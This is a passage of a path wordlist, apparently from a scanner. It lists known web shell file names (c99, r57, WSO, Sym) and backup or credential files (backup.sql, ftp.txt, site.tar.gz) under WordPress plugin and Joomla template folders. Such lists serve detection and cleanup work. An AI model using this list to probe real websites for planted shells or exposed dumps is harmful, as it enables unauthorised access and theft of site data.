'wp-content/plugins/akismet/0day.php',
'wp-content/plugins/akismet/tmp/admin.php',
'wp-content/plugins/akismet/L3b.php',
'wp-content/plugins/akismet/d.php',
'wp-content/plugins/akismet/tmp/d.php',
'wp-content/plugins/akismet/tmp/L3b.php',
'wp-content/plugins/akismet/sado.php',
'wp-content/plugins/akismet/admin1.php',
'wp-content/plugins/akismet/upload.php',
'wp-content/plugins/akismet/up.php',
'wp-content/plugins/akismet/vb.zip',
'wp-content/plugins/akismet/vb.rar',
'wp-content/plugins/akismet/admin2.asp',
'wp-content/plugins/akismet/uploads.php',
'wp-content/plugins/akismet/sa.php',
'wp-content/plugins/akismet/sysadmins/',
'wp-content/plugins/akismet/admin1/',
'wp-content/plugins/akismet/sniper.php',
'wp-content/plugins/akismet/images/Sym.php',
'wp-content/plugins/akismet//r57.php',
'wp-content/plugins/akismet/gzaa_spysl',
'wp-content/plugins/akismet/sql-new.php',
'wp-content/plugins/akismet//shell.php',
'wp-content/plugins/akismet//sa.php',
'wp-content/plugins/akismet//admin.php',
'wp-content/plugins/akismet//sa2.php',
'wp-content/plugins/akismet//2.php',
'wp-content/plugins/akismet//gaza.php',
'wp-content/plugins/akismet//up.php',
'wp-content/plugins/akismet//upload.php',
'wp-content/plugins/akismet//uploads.php',
'wp-content/plugins/akismet/shell.php',
'wp-content/plugins/akismet//amad.php',
'wp-content/plugins/akismet//t00.php',
'wp-content/plugins/akismet//dz.php',
'wp-content/plugins/akismet//site.rar',
'wp-content/plugins/akismet//Black.php',
'wp-content/plugins/akismet//site.tar.gz',
'wp-content/plugins/akismet//home.zip',
'wp-content/plugins/akismet//home.rar',
'wp-content/plugins/akismet//home.tar',
'wp-content/plugins/akismet//home.tar.gz',
'wp-content/plugins/akismet//forum.zip',
'wp-content/plugins/akismet//forum.rar',
'wp-content/plugins/akismet//forum.tar',
'wp-content/plugins/akismet//forum.tar.gz',
'wp-content/plugins/akismet//test.txt',
'wp-content/plugins/akismet//ftp.txt',
'wp-content/plugins/akismet//user.txt',
'wp-content/plugins/akismet//site.txt',
'wp-content/plugins/akismet//error_log',
'wp-content/plugins/akismet//error',
'wp-content/plugins/akismet//cpanel',
'wp-content/plugins/akismet//awstats',
'wp-content/plugins/akismet//site.sql',
'wp-content/plugins/akismet//vb.sql',
'wp-content/plugins/akismet//forum.sql',
'wp-content/plugins/akismet/r00t-s3c.php',
'wp-content/plugins/akismet/c.php',
'wp-content/plugins/akismet//backup.sql',
'wp-content/plugins/akismet//back.sql',
'wp-content/plugins/akismet//data.sql',
'wp-content/plugins/akismet/wp.rar/',
'wp-content/plugins/akismet/asp.aspx',
'wp-content/plugins/akismet/tmp/vaga.php',
'wp-content/plugins/akismet/tmp/killer.php',
'wp-content/plugins/akismet/whmcs.php',
'wp-content/plugins/akismet/abuhlail.php',
'wp-content/plugins/akismet/tmp/killer.php',
'wp-content/plugins/akismet/tmp/domaine.pl',
'wp-content/plugins/akismet/tmp/domaine.php',
'wp-content/plugins/akismet/useradmin/',
'wp-content/plugins/akismet/tmp/d0maine.php',
'wp-content/plugins/akismet/d0maine.php',
'wp-content/plugins/akismet/tmp/sql.php',
'wp-content/plugins/akismet/X.php',
'wp-content/plugins/akismet/123.php',
'wp-content/plugins/akismet/m.php',
'wp-content/plugins/akismet/b.php',
'wp-content/plugins/akismet/up.php',
'wp-content/plugins/akismet/tmp/dz1.php',
'wp-content/plugins/akismet/dz1.php',
'wp-content/plugins/akismet/forum.zip',
'wp-content/plugins/akismet/Symlink.php',
'wp-content/plugins/akismet/Symlink.pl',
'wp-content/plugins/akismet/forum.rar',
'wp-content/plugins/akismet/joomla.zip',
'wp-content/plugins/akismet/joomla.rar',
'wp-content/plugins/akismet/wp.php',
'wp-content/plugins/akismet/buck.sql',
'wp-content/plugins/akismet/sysadmin.php',
'wp-content/plugins/akismet/images/c99.php',
'wp-content/plugins/akismet/xd.php',
'wp-content/plugins/akismet/c100.php',
'wp-content/plugins/akismet/spy.aspx',
'wp-content/plugins/akismet/xd.php',
'wp-content/plugins/akismet/tmp/xd.php',
'wp-content/plugins/akismet/sym/root/home/',
'wp-content/plugins/akismet/billing/killer.php',
'wp-content/plugins/akismet/tmp/upload.php',
'wp-content/plugins/akismet/tmp/admin.php',
'wp-content/plugins/akismet/Server.php',
'wp-content/plugins/akismet/tmp/uploads.php',
'wp-content/plugins/akismet/tmp/up.php',
'wp-content/plugins/akismet/Server/',
'wp-content/plugins/akismet/wp-admin/c99.php',
'wp-content/plugins/akismet/tmp/priv8.php',
'wp-content/plugins/akismet/priv8.php',
'wp-content/plugins/akismet/cgi.pl/',
'wp-content/plugins/akismet/tmp/cgi.pl',
'wp-content/plugins/akismet/downloads/dom.php',
'wp-content/plugins/akismet/webadmin.html',
'wp-content/plugins/akismet/admins.php',
'wp-content/plugins/akismet/bluff.php',
'wp-content/plugins/akismet/king.jeen',
'wp-content/plugins/akismet/admins/',
'wp-content/plugins/akismet/admins.asp',
'wp-content/plugins/akismet/admins.php',
'wp-content/plugins/akismet/wp.zip',
'wp-content/plugins/akismet/disqus.php',
'wp-content/plugins/google-sitemap-generator//cpanel',
'wp-content/plugins/google-sitemap-generator//awstats',
'wp-content/plugins/google-sitemap-generator//site.sql',
'wp-content/plugins/google-sitemap-generator//vb.sql',
'wp-content/plugins/google-sitemap-generator//forum.sql',
'wp-content/plugins/google-sitemap-generator/r00t-s3c.php',
'wp-content/plugins/google-sitemap-generator/c.php',
'wp-content/plugins/google-sitemap-generator//backup.sql',
'wp-content/plugins/google-sitemap-generator//back.sql',
'wp-content/plugins/google-sitemap-generator//data.sql',
'wp-content/plugins/google-sitemap-generator/wp.rar/',
'wp-content/plugins/google-sitemap-generator/asp.aspx',
'wp-content/plugins/google-sitemap-generator/tmp/vaga.php',
'wp-content/plugins/google-sitemap-generator/tmp/killer.php',
'wp-content/plugins/google-sitemap-generator/whmcs.php',
'wp-content/plugins/google-sitemap-generator/abuhlail.php',
'wp-content/plugins/google-sitemap-generator/tmp/killer.php',
'wp-content/plugins/google-sitemap-generator/tmp/domaine.pl',
'wp-content/plugins/google-sitemap-generator/tmp/domaine.php',
'wp-content/plugins/google-sitemap-generator/useradmin/',
'wp-content/plugins/google-sitemap-generator/tmp/d0maine.php',
'wp-content/plugins/google-sitemap-generator/d0maine.php',
'wp-content/plugins/google-sitemap-generator/tmp/sql.php',
'wp-content/plugins/google-sitemap-generator/X.php',
'wp-content/plugins/google-sitemap-generator/123.php',
'wp-content/plugins/google-sitemap-generator/m.php',
'wp-content/plugins/google-sitemap-generator/b.php',
'wp-content/plugins/google-sitemap-generator/up.php',
'wp-content/plugins/google-sitemap-generator/tmp/dz1.php',
'wp-content/plugins/google-sitemap-generator/dz1.php',
'wp-content/plugins/google-sitemap-generator/forum.zip',
'wp-content/plugins/google-sitemap-generator/Symlink.php',
'wp-content/plugins/google-sitemap-generator/Symlink.pl',
'wp-content/plugins/google-sitemap-generator/forum.rar',
'wp-content/plugins/google-sitemap-generator/joomla.zip',
'wp-content/plugins/google-sitemap-generator/joomla.rar',
'wp-content/plugins/google-sitemap-generator/wp.php',
'wp-content/plugins/google-sitemap-generator/buck.sql',
'wp-content/plugins/google-sitemap-generator/sysadmin.php',
'wp-content/plugins/google-sitemap-generator/images/c99.php',
'wp-content/plugins/google-sitemap-generator/xd.php',
'wp-content/plugins/google-sitemap-generator/c100.php',
'wp-content/plugins/google-sitemap-generator/spy.aspx',
'wp-content/plugins/google-sitemap-generator/xd.php',
'wp-content/plugins/google-sitemap-generator/tmp/xd.php',
'wp-content/plugins/google-sitemap-generator/sym/root/home/',
'wp-content/plugins/google-sitemap-generator/billing/killer.php',
'wp-content/plugins/google-sitemap-generator/tmp/upload.php',
'wp-content/plugins/google-sitemap-generator/tmp/admin.php',
'wp-content/plugins/google-sitemap-generator/Server.php',
'wp-content/plugins/google-sitemap-generator/tmp/uploads.php',
'wp-content/plugins/google-sitemap-generator/tmp/up.php',
'wp-content/plugins/google-sitemap-generator/Server/',
'wp-content/plugins/google-sitemap-generator/wp-admin/c99.php',
'wp-content/plugins/google-sitemap-generator/tmp/priv8.php',
'wp-content/plugins/google-sitemap-generator/priv8.php',
'wp-content/plugins/google-sitemap-generator/cgi.pl/',
'wp-content/plugins/google-sitemap-generator/tmp/cgi.pl',
'wp-content/plugins/google-sitemap-generator/downloads/dom.php',
'wp-content/plugins/google-sitemap-generator/webadmin.html',
'wp-content/plugins/google-sitemap-generator/admins.php',
'wp-content/plugins/google-sitemap-generator/bluff.php',
'wp-content/plugins/google-sitemap-generator/king.jeen',
'wp-content/plugins/google-sitemap-generator/admins/',
'wp-content/plugins/google-sitemap-generator/admins.asp',
'wp-content/plugins/google-sitemap-generator/admins.php',
'wp-content/plugins/google-sitemap-generator/wp.zip',
'wp-content/plugins/google-sitemap-generator/sitemap-core.php',
'/templates/beez/WSO.php',
'/templates/beez/dz.php',
'/templates/beez/DZ.php',
'/templates/beez/cpanel.php',
'/templates/beez/cpn.php',
'/templates/beez/sos.php',
'/templates/beez/term.php',
'/templates/beez/Sec-War.php',
'/templates/beez/sql.php',
'/templates/beez/ssl.php',
'/templates/beez/mysql.php',
'/templates/beez/WolF.php',
'/templates/beez/madspot.php',
'/templates/beez/Cgishell.pl',
'/templates/beez/killer.php',
'/templates/beez/changeall.php',
'/templates/beez/2.php',
'/templates/beez/Sh3ll.php',
'/templates/beez/dz0.php',
'/templates/beez/dam.php',
'/templates/beez/user.php',
'/templates/beez/dom.php',
'/templates/beez/whmcs.php',
'/templates/beez/vb.zip',
'/templates/beez/r00t.php',
'/templates/beez/c99.php',
'/templates/beez/gaza.php',
'/templates/beez/1.php',
'/templates/beez/d0mains.php',
'/templates/beez/madspotshell.php',
'/templates/beez/info.php',
'/templates/beez/egyshell.php',
'/templates/beez/Sym.php',
'/templates/beez/c22.php',
'/templates/beez/c100.php',
'/templates/beez/configuration.php',
'/templates/beez/g.php',
'/templates/beez/xx.pl',
'/templates/beez/ls.php',
'/templates/beez/Cpanel.php',
'/templates/beez/k.php',
'/templates/beez/zone-h.php',
'/templates/beez/tmp/user.php',
'/templates/beez/tmp/Sym.php',
'/templates/beez/cp.php',
'/templates/beez/tmp/madspotshell.php',
'/templates/beez/tmp/root.php',
'/templates/beez/tmp/whmcs.php',
'/templates/beez/tmp/index.php',
'/templates/beez/tmp/2.php',
'/templates/beez/tmp/dz.php',
'/templates/beez/tmp/cpn.php',
'/templates/beez/tmp/changeall.php',
'/templates/beez/tmp/Cgishell.pl',
'/templates/beez/tmp/sql.php',
'/templates/beez/0day.php',
'/templates/beez/tmp/admin.php',
'/templates/beez/L3b.php',
'/templates/beez/d.php',
'/templates/beez/tmp/d.php',
'/templates/beez/tmp/L3b.php',
'/templates/beez/sado.php',
'/templates/beez/admin1.php',
'/templates/beez/upload.php',
'/templates/beez/up.php',
'/templates/beez/vb.zip',
'/templates/beez/vb.rar',
'/templates/beez/admin2.asp',
'/templates/beez/uploads.php',
'/templates/beez/sa.php',
'/templates/beez/sysadmins/',
'/templates/beez/admin1/',
'/templates/beez/sniper.php',
'/templates/beez/images/Sym.php',
'/templates/beez//r57.php',
'/templates/beez/gzaa_spysl',
'/templates/beez/sql-new.php',
'/templates/beez//shell.php',
'/templates/beez//sa.php',
'/templates/beez//admin.php',
'/templates/beez//sa2.php',
'/templates/beez//2.php',
'/templates/beez//gaza.php',
'/templates/beez//up.php',
'/templates/beez//upload.php',
'/templates/beez//uploads.php',
'/templates/beez/shell.php',
'/templates/beez//amad.php',
'/templates/beez//t00.php',
'/templates/beez//dz.php',
'/templates/beez//site.rar',
'/templates/beez//Black.php',
'/templates/beez//site.tar.gz',
'/templates/beez//home.zip',
'/templates/beez//home.rar',
'/templates/beez//home.tar',
'/templates/beez//home.tar.gz',
'/templates/beez//forum.zip',
'/templates/beez//forum.rar',
'/templates/beez//forum.tar',
'/templates/beez//forum.tar.gz',
'/templates/beez//test.txt',
'/templates/beez//ftp.txt',
'/templates/beez//user.txt',
'/templates/beez//site.txt',
'/templates/beez//error_log',
'/templates/beez//error',
'/templates/beez//cpanel',
'/templates/beez//awstats',
'/templates/beez//site.sql',
'/templates/beez//vb.sql',
'/templates/beez//forum.sql',
'/templates/beez/r00t-s3c.php',
'/templates/beez/c.php',
'/templates/beez//backup.sql',
'/templates/beez//back.sql',
'/templates/beez//data.sql',
'/templates/beez/wp.rar/',
'/templates/beez/asp.aspx',
'/templates/beez/tmp/vaga.php',
'/templates/beez/tmp/killer.php',
'/templates/beez/whmcs.php',
'/templates/beez/abuhlail.php',
'/templates/beez/tmp/killer.php',
'/templates/beez/tmp/domaine.pl',
'/templates/beez/tmp/domaine.php',
'/templates/beez/useradmin/',
'/templates/beez/tmp/d0maine.php',
'/templates/beez/d0maine.php',
'/templates/beez/tmp/sql.php',
'/templates/beez/X.php',
'/templates/beez/123.php',
'/templates/beez/m.php',
'/templates/beez/b.php',
'/templates/beez/up.php',
'/templates/beez/tmp/dz1.php',
'/templates/beez/dz1.php',
'/templates/beez/forum.zip',
'/templates/beez/Symlink.php',
'/templates/beez/Symlink.pl',
'/templates/beez/forum.rar',
'/templates/beez/joomla.zip',
'/templates/beez/joomla.rar',
'/templates/beez/wp.php',
'/templates/beez/buck.sql',
'/templates/beez/sysadmin.php',
'/templates/beez/images/c99.php',
'/templates/beez/xd.php',
'/templates/beez/c100.php',
'/templates/beez/spy.aspx',
'/templates/beez/xd.php',
'/templates/beez/tmp/xd.php',
'/templates/beez/sym/root/home/',
'/templates/beez/billing/killer.php',
'/templates/beez/tmp/upload.php',
'/templates/beez/tmp/admin.php',
'/templates/beez/Server.php',
'/templates/beez/tmp/uploads.php',
'/templates/beez/tmp/up.php',
'/templates/beez/Server/',
'/templates/beez/wp-admin/c99.php',
'/templates/beez/tmp/priv8.php',
'/templates/beez/priv8.php',
'/templates/beez/cgi.pl/',
'/templates/beez/tmp/cgi.pl',
'/templates/beez/downloads/dom.php',
'/templates/beez/webadmin.html',
'/templates/beez/admins.php',
'/templates/beez/bluff.php',
'/templates/beez/king.jeen',
'/templates/beez/admins/',
'/templates/beez/admins.asp',
'/templates/beez/admins.php',
'/templates/beez/wp.zip',
'/templates/beez/index.php','/images/WSO.php',
'/images/dz.php',
'/images/DZ.php',
'/images/cpanel.php',
'/images/cpn.php',
'/images/sos.php',
'/images/term.php',
'/images/Sec-War.php',
'/images/sql.php',
'/images/ssl.php',
'/images/mysql.php',
'/images/WolF.php',
'/images/madspot.php',
'/images/Cgishell.pl',
'/images/killer.php',
'/images/changeall.php',
'/images/2.php',
'/images/Sh3ll.php',
'/images/dz0.php',
'/images/dam.php',
'/images/user.php',
'/images/dom.php',
'/images/whmcs.php',
'/images/vb.zip',
'/images/r00t.php',
'/images/c99.php',
'/images/gaza.php',
'/images/1.php',
'/images/d0mains.php',
'/images/madspotshell.php',
'/images/info.php',
'/images/egyshell.php',
'/images/Sym.php',
'/images/c22.php',
'/images/c100.php',
'/images/configuration.php',
'/images/g.php',
'/images/xx.pl',
'/images/ls.php',
'/images/Cpanel.php',
'/images/k.php',
'/images/zone-h.php',
'/images/tmp/user.php',
'/images/tmp/Sym.php',
'/images/cp.php',
'/images/tmp/madspotshell.php',
'/images/tmp/root.php',
'/images/tmp/whmcs.php',
'/images/tmp/index.php',
'/images/tmp/2.php',
'/images/tmp/dz.php',
'/images/tmp/cpn.php',
'/images/tmp/changeall.php',
'/images/tmp/Cgishell.pl',
'/images/tmp/sql.php',
'/images/0day.php',
'/images/tmp/admin.php',
'/images/L3b.php',
'/images/d.php',
'/images/tmp/d.php',
'/images/tmp/L3b.php',
'/images/sado.php',
'/images/admin1.php',
'/images/upload.php',
'/images/up.php',
'/images/vb.zip',
'/images/vb.rar',
'/images/admin2.asp',
'/images/uploads.php',
'/images/sa.php',
'/images/sysadmins/',
'/images/admin1/',
'/images/sniper.php',
'/images/images/Sym.php',
'/images//r57.php',
'/images/gzaa_spysl',
'/images/sql-new.php',
'/images//shell.php',
'/images//sa.php',
'/images//admin.php',
'/images//sa2.php',
'/images//2.php',
'/images//gaza.php',
'/images//up.php',
'/images//upload.php',
'/images//uploads.php',
'/images/shell.php',
'/images//amad.php',
'/images//t00.php',
'/images//dz.php',
'/images//site.rar',
'/images//Black.php',
'/images//site.tar.gz',
'/images//home.zip',
'/images//home.rar',
'/images//home.tar',
'/images//home.tar.gz',
'/images//forum.zip',
'/images//forum.rar',
'/images//forum.tar',
'/images//forum.tar.gz',
'/images//test.txt',
'/images//ftp.txt',
'/images//user.txt',
'/images//site.txt',
'/images//error_log',
'/images//error',
'/images//cpanel',
'/images//awstats',
'/images//site.sql',
'/images//vb.sql',
'/images//forum.sql',
'/images/r00t-s3c.php',
'/images/c.php',
'/images//backup.sql',
'/images//back.sql',
'/images//data.sql',
'/images/wp.rar/',
'/images/asp.aspx',
'/images/tmp/vaga.php',
'/images/tmp/killer.php',
'/images/whmcs.php',
'/images/abuhlail.php',
'/images/tmp/killer.php',
'/images/tmp/domaine.pl',
'/images/tmp/domaine.php',
'/images/useradmin/',
'/images/tmp/d0maine.php',
'/images/d0maine.php',
'/images/tmp/sql.php',
'/images/X.php',
'/images/123.php',
'/images/m.php',
'/images/b.php',
'/images/up.php',
'/images/tmp/dz1.php',
'/images/dz1.php',
'/images/forum.zip',
'/images/Symlink.php',
'/images/Symlink.pl',
'/images/forum.rar',
'/images/joomla.zip',
'/images/joomla.rar',
'/images/wp.php',
'/images/buck.sql',
'/includes/WSO.php',
'/includes/dz.php',
'/includes/DZ.php',
'/includes/cpanel.php',
'/includes/cpn.php',
'/includes/sos.php',
'/includes/term.php',
'/includes/Sec-War.php',
'/includes/sql.php',
'/includes/ssl.php',
'/includes/mysql.php',
'/includes/WolF.php',
'/includes/madspot.php',
'/includes/Cgishell.pl',
'/includes/killer.php',
'/includes/changeall.php',
'/includes/2.php',
'/includes/Sh3ll.php',
'/includes/dz0.php',
'/includes/dam.php',
'/includes/user.php',
'/includes/dom.php',
'/includes/whmcs.php',
'/includes/vb.zip',
'/includes/r00t.php',
'/includes/c99.php',
'/includes/gaza.php',
'/includes/1.php',
'/includes/d0mains.php',
'/includes/madspotshell.php',
'/includes/info.php',
'/includes/egyshell.php',
'/includes/Sym.php',
'/includes/c22.php',
'/includes/c100.php',
'/includes/configuration.php',
'/includes/g.php',
'/includes/xx.pl',
'/includes/ls.php',
'/includes/Cpanel.php',
'/includes/k.php',
'/includes/zone-h.php',
'/includes/tmp/user.php',
'/includes/tmp/Sym.php',
'/includes/cp.php',
'/includes/tmp/madspotshell.php',
'/includes/tmp/root.php',
'/includes/tmp/whmcs.php',
'/includes/tmp/index.php',
'/includes/tmp/2.php',
'/includes/tmp/dz.php',
'/includes/tmp/cpn.php',
'/includes/tmp/changeall.php',
'/includes/tmp/Cgishell.pl',
'/includes/tmp/sql.php',
'/includes/0day.php',
'/includes/tmp/admin.php',
'/includes/L3b.php',
'/includes/d.php',
'/includes/tmp/d.php',
'/includes/tmp/L3b.php',
'/includes/sado.php',
'/includes/admin1.php',
'/includes/upload.php',
'/includes/up.php',
'/includes/vb.zip',
'/includes/vb.rar',
'/includes/admin2.asp',
'/includes/uploads.php',
'/includes/sa.php',
'/includes/sysadmins/',
'/includes/admin1/',
'/includes/sniper.php',
'/includes/images/Sym.php',
'/includes//r57.php',
'/includes/gzaa_spysl',
'/includes/sql-new.php',
'/includes//shell.php',
'/includes//sa.php',
'/includes//admin.php',
'/includes//sa2.php',
'/includes//2.php',
'/includes//gaza.php',
'/includes//up.php',
'/includes//upload.php',
'/includes//uploads.php',
'/includes/shell.php',
'/includes//amad.php',
'/includes//t00.php',
'/includes//dz.php',
'/includes//site.rar',
'/includes//Black.php',
'/includes//site.tar.gz',
'/includes//home.zip',
'/includes//home.rar',
'/includes//home.tar',
'/includes//home.tar.gz',
'/includes//forum.zip',
'/includes//forum.rar',
'/includes//forum.tar',
'/includes//forum.tar.gz',
'/includes//test.txt',
'/includes//ftp.txt',
'/includes//user.txt',
'/includes//site.txt',
'/includes//error_log',
'/includes//error',
'/includes//cpanel',
'/includes//awstats',
'/includes//site.sql',
'/includes//vb.sql',
'/includes//forum.sql',
'/includes/r00t-s3c.php',
'/includes/c.php',
'/includes//backup.sql',
'/includes//back.sql',
'/includes//data.sql',
'/includes/wp.rar/',
'/includes/asp.aspx',
'/includes/tmp/vaga.php',
'/includes/tmp/killer.php',
'/includes/whmcs.php',
'/includes/abuhlail.php',
'/includes/tmp/killer.php',
'/includes/tmp/domaine.pl',
'/includes/tmp/domaine.php',
'/includes/useradmin/',
'/includes/tmp/d0maine.php',
'/includes/d0maine.php',
'/includes/tmp/sql.php',
'/includes/X.php',
'/includes/123.php',
'/includes/m.php',
'/includes/b.php',
'/includes/up.php',
'/includes/tmp/dz1.php',
'/includes/dz1.php',
'/includes/forum.zip',
'/includes/Symlink.php',
'/includes/Symlink.pl',
'/includes/forum.rar',
'/includes/joomla.zip',
'/includes/joomla.rar',
'/includes/wp.php',
'/includes/buck.sql',
'/includes/sysadmin.php',
'/includes/images/c99.php',
'/includes/xd.php',
'/includes/c100.php',
'/includes/spy.aspx',
'/includes/xd.php',
'/includes/tmp/xd.php',
'/includes/sym/root/home/',
'/includes/billing/killer.php',
'/includes/tmp/upload.php',
'/includes/tmp/admin.php',
'/includes/Server.php',
'/includes/tmp/uploads.php',
'/includes/tmp/up.php',
'/includes/Server/',
'/includes/wp-admin/c99.php',
'/includes/tmp/priv8.php',
'/includes/priv8.php',
'/includes/cgi.pl/',
'/includes/tmp/cgi.pl',
'/includes/downloads/dom.php',
'/includes/webadmin.html',
'/includes/admins.php',
'/includes/bluff.php',
'/includes/king.jeen',
'/includes/admins/',
'/includes/admins.asp',
'/includes/admins.php',
'/includes/wp.zip',
'/includes/',
'/templates/rhuk_milkyway/WSO.php',
'/templates/rhuk_milkyway/dz.php',
'/templates/rhuk_milkyway/DZ.php',
'/templates/rhuk_milkyway/cpanel.php',
'/templates/rhuk_milkyway/cpn.php',
'/templates/rhuk_milkyway/sos.php',
'/templates/rhuk_milkyway/term.php',
'/templates/rhuk_milkyway/Sec-War.php',
'/templates/rhuk_milkyway/sql.php',
'/templates/rhuk_milkyway/ssl.php',
'/templates/rhuk_milkyway/mysql.php',
'/templates/rhuk_milkyway/WolF.php',
'/templates/rhuk_milkyway/madspot.php',
'/templates/rhuk_milkyway/Cgishell.pl',
'/templates/rhuk_milkyway/killer.php',
'/templates/rhuk_milkyway/changeall.php',
'/templates/rhuk_milkyway/2.php',
'/templates/rhuk_milkyway/Sh3ll.php',
'/templates/rhuk_milkyway/dz0.php',
'/templates/rhuk_milkyway/dam.php',
'/templates/rhuk_milkyway/user.php',
'/templates/rhuk_milkyway/dom.php',
'/templates/rhuk_milkyway/whmcs.php',
'/templates/rhuk_milkyway/vb.zip',
'/templates/rhuk_milkyway/r00t.php',
'/templates/rhuk_milkyway/c99.php',
'/templates/rhuk_milkyway/gaza.php',
'/templates/rhuk_milkyway/1.php',
'/templates/rhuk_milkyway/d0mains.php',
'/templates/rhuk_milkyway/madspotshell.php',
'/templates/rhuk_milkyway/info.php',
'/templates/rhuk_milkyway/egyshell.php',
'/templates/rhuk_milkyway/Sym.php',
'/templates/rhuk_milkyway/c22.php',
'/templates/rhuk_milkyway/c100.php',
'/templates/rhuk_milkyway/configuration.php',
'/templates/rhuk_milkyway/g.php',
'/templates/rhuk_milkyway/xx.pl',
'/templates/rhuk_milkyway/ls.php',
'/templates/rhuk_milkyway/Cpanel.php',
'/templates/rhuk_milkyway/k.php',
'/templates/rhuk_milkyway/zone-h.php',
'/templates/rhuk_milkyway/tmp/user.php',
'/templates/rhuk_milkyway/tmp/Sym.php',
'/templates/rhuk_milkyway/cp.php',
'/templates/rhuk_milkyway/tmp/madspotshell.php',
'/templates/rhuk_milkyway/tmp/root.php',
'/templates/rhuk_milkyway/tmp/whmcs.php',
'/templates/rhuk_milkyway/tmp/index.php',
'/templates/rhuk_milkyway/tmp/2.php',
'/templates/rhuk_milkyway/tmp/dz.php',
'/templates/rhuk_milkyway/tmp/cpn.php',
'/templates/rhuk_milkyway/tmp/changeall.php',
'/templates/rhuk_milkyway/tmp/Cgishell.pl',
'/templates/rhuk_milkyway/tmp/sql.php',
'/templates/rhuk_milkyway/0day.php',
'/templates/rhuk_milkyway/tmp/admin.php',
'/templates/rhuk_milkyway/L3b.php',
'/templates/rhuk_milkyway/d.php',
'/templates/rhuk_milkyway/tmp/d.php',
'/templates/rhuk_milkyway/tmp/L3b.php',
'/templates/rhuk_milkyway/sado.php',
'/templates/rhuk_milkyway/admin1.php',
'/templates/rhuk_milkyway/upload.php',
'/templates/rhuk_milkyway/up.php',
'/templates/rhuk_milkyway/vb.zip',
'/templates/rhuk_milkyway/vb.rar',
'/templates/rhuk_milkyway/admin2.asp',
'/templates/rhuk_milkyway/uploads.php',
'/templates/rhuk_milkyway/sa.php',
'/templates/rhuk_milkyway/sysadmins/',
'/templates/rhuk_milkyway/admin1/',
'/templates/rhuk_milkyway/sniper.php',
'/templates/rhuk_milkyway/images/Sym.php',
'/templates/rhuk_milkyway//r57.php',
'/templates/rhuk_milkyway/gzaa_spysl',
'/templates/rhuk_milkyway/sql-new.php',
'/templates/rhuk_milkyway//shell.php',
'/templates/rhuk_milkyway//sa.php',
'/templates/rhuk_milkyway//admin.php',
'/templates/rhuk_milkyway//sa2.php',
'/templates/rhuk_milkyway//2.php',
'/templates/rhuk_milkyway//gaza.php',
'/templates/rhuk_milkyway//up.php',
'/templates/rhuk_milkyway//upload.php',
'/templates/rhuk_milkyway//uploads.php',
'/templates/rhuk_milkyway/shell.php',
'/templates/rhuk_milkyway//amad.php',
'/templates/rhuk_milkyway//t00.php',
'/templates/rhuk_milkyway//dz.php',
'/templates/rhuk_milkyway//site.rar',
'/templates/rhuk_milkyway//Black.php',
'/templates/rhuk_milkyway//site.tar.gz',
'/templates/rhuk_milkyway//home.zip',
'/templates/rhuk_milkyway//home.rar',
'/templates/rhuk_milkyway//home.tar',
'/templates/rhuk_milkyway//home.tar.gz',
'/templates/rhuk_milkyway//forum.zip',
'/templates/rhuk_milkyway//forum.rar',
'/templates/rhuk_milkyway//forum.tar',
'/templates/rhuk_milkyway//forum.tar.gz',
'/templates/rhuk_milkyway//test.txt',
'/templates/rhuk_milkyway//ftp.txt',
'/templates/rhuk_milkyway//user.txt',
'/templates/rhuk_milkyway//site.txt',
'/templates/rhuk_milkyway//error_log',
'/templates/rhuk_milkyway//error',
'/templates/rhuk_milkyway//cpanel',
'/templates/rhuk_milkyway//awstats',
'/templates/rhuk_milkyway//site.sql',
'/templates/rhuk_milkyway//vb.sql',
'/templates/rhuk_milkyway//forum.sql',
'/templates/rhuk_milkyway/r00t-s3c.php',
'/templates/rhuk_milkyway/c.php',
'/templates/rhuk_milkyway//backup.sql',
'/templates/rhuk_milkyway//back.sql',
'/templates/rhuk_milkyway//data.sql',
'/templates/rhuk_milkyway/wp.rar/',
'/templates/rhuk_milkyway/asp.aspx',
'/templates/rhuk_milkyway/tmp/vaga.php',
'/templates/rhuk_milkyway/tmp/killer.php',
'/templates/rhuk_milkyway/whmcs.php',
'/templates/rhuk_milkyway/abuhlail.php',
'/templates/rhuk_milkyway/tmp/killer.php',
'/templates/rhuk_milkyway/tmp/domaine.pl',
'/templates/rhuk_milkyway/tmp/domaine.php',
'/templates/rhuk_milkyway/useradmin/',
'/templates/rhuk_milkyway/tmp/d0maine.php',
'/templates/rhuk_milkyway/d0maine.php',
'/templates/rhuk_milkyway/tmp/sql.php',
'/templates/rhuk_milkyway/X.php',
'/templates/rhuk_milkyway/123.php',
'/templates/rhuk_milkyway/m.php',
'/templates/rhuk_milkyway/b.php',
'/templates/rhuk_milkyway/up.php',
'/templates/rhuk_milkyway/tmp/dz1.php',
'/templates/rhuk_milkyway/dz1.php',
'/templates/rhuk_milkyway/forum.zip',
'/templates/rhuk_milkyway/Symlink.php',
'/templates/rhuk_milkyway/Symlink.pl',
'/templates/rhuk_milkyway/forum.rar',
'/templates/rhuk_milkyway/joomla.zip',
'/templates/rhuk_milkyway/joomla.rar',
'/templates/rhuk_milkyway/wp.php',
'/templates/rhuk_milkyway/buck.sql',
'/templates/rhuk_milkyway/sysadmin.php',
'/templates/rhuk_milkyway/images/c99.php',
'/templates/rhuk_milkyway/xd.php',
'/templates/rhuk_milkyway/c100.php',
'/templates/rhuk_milkyway/spy.aspx',
'/templates/rhuk_milkyway/xd.php',
'/templates/rhuk_milkyway/tmp/xd.php',
'/templates/rhuk_milkyway/sym/root/home/',
'/templates/rhuk_milkyway/billing/killer.php',
'/templates/rhuk_milkyway/tmp/upload.php',
'/templates/rhuk_milkyway/tmp/admin.php',
'/templates/rhuk_milkyway/Server.php',
'/templates/rhuk_milkyway/tmp/uploads.php',
'/templates/rhuk_milkyway/tmp/up.php',
'/templates/rhuk_milkyway/Server/',
'/templates/rhuk_milkyway/wp-admin/c99.php',
'/templates/rhuk_milkyway/tmp/priv8.php',
'/templates/rhuk_milkyway/priv8.php',
'/templates/rhuk_milkyway/cgi.pl/',
'/templates/rhuk_milkyway/tmp/cgi.pl',
'/templates/rhuk_milkyway/downloads/dom.php',
'/templates/rhuk_milkyway/webadmin.html',
'/templates/rhuk_milkyway/admins.php',
'/templates/rhuk_milkyway/bluff.php',
'/templates/rhuk_milkyway/king.jeen',
'/templates/rhuk_milkyway/admins/',
'/templates/rhuk_milkyway/admins.asp',
'/templates/rhuk_milkyway/admins.php',
'/templates/rhuk_milkyway/wp.zip',
'/templates/rhuk_milkyway/','WSO.php',
'a.php',
'z.php',
'e.php',
'r.php',
't.php',
'y.php',
'u.php',
'i.php',
'o.php',
'p.php',
